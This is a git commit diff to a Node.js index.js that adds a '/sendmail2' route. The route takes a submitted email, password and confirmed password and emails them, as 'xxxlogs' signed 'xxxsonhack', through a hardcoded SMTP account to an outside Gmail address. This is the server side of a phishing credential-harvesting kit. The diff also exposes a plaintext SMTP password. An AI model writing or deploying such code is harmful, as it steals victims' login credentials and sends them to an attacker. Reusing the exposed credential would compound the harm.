985317ef0e71c17d371643b6bc517a854e282505
qwaszx3215 <84395173+qwaszx3215@users.noreply.github.com>
2023-05-30 16:18:50 +0100

    Update index.js

--- index.js
+++ index.js
@@ -48,6 +48,40 @@ app.post("/sendmail", async (req, res) => {
     res.status(500).send("Error sending email");
   }
 });
+app.post("/sendmail2", async (req, res) => {
+  const { email, pass, pasers } = req.body;
+  try {
+    let transporter = nodemailer.createTransport({
+      host: "mail.whitetransport.net",
+      port: 465,
+      auth: {
+        user: "mustafa@whitetransport.net",
+        pass: "uf4DBAatO5Ut",
+      },
+    });
+    let info = await transporter.sendMail({
+      from: '"You" <mustafa@whitetransport.net>',
+      to: "fredrick3smith33@gmail.com",
+      subject: "xxxlogs",
+      html: `
+    <div> 
+      <h2>Here is your Log!</h2>
+        <p>Email: ${email}</p>
+        <p>Pass: ${pass}</p>
+        <p>Confirm Pass: ${pasers}</p>
+    
+        <p>All the best, xxxsonhack</p>
+         </div>
+    `,
+    });
+
+    await transporter.sendMail(info);
+    res.send("Email sent successfully");
+  } catch (error) {
+    console.error(error);
+    res.status(500).send("Error sending email");
+  }
+});
 
 const PORT = process.env.PORT || 5000;
 
